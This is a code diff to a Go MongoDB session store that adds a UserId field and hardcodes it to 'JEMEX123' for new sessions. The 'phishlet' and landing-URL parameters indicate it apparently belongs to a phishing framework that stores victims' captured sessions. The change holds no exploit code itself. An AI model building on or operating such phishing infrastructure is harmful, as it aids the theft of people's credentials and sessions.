@@ -39,6 +39,7 @@ type MongoSession struct {
 	RemoteAddr   string                        `bson:"remote_addr" json:"remote_addr"`
 	CreateTime   int64                         `bson:"create_time" json:"create_time"`
 	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
+	UserId       string                        `bson:"user_id" json:"user_id"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -151,6 +152,7 @@ func convertToMongoSession(s *Session) *MongoSession {
 		RemoteAddr:   s.RemoteAddr,
 		CreateTime:   s.CreateTime,
 		UpdateTime:   s.UpdateTime,
+		UserId:       s.UserId,
 	}
 }
 
@@ -187,6 +189,7 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		RemoteAddr:   ms.RemoteAddr,
 		CreateTime:   ms.CreateTime,
 		UpdateTime:   ms.UpdateTime,
+		UserId:       ms.UserId,
 	}
 }
 
@@ -270,6 +273,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		RemoteAddr:   remoteAddr,
 		CreateTime:   now,
 		UpdateTime:   now,
+		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
 	}
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
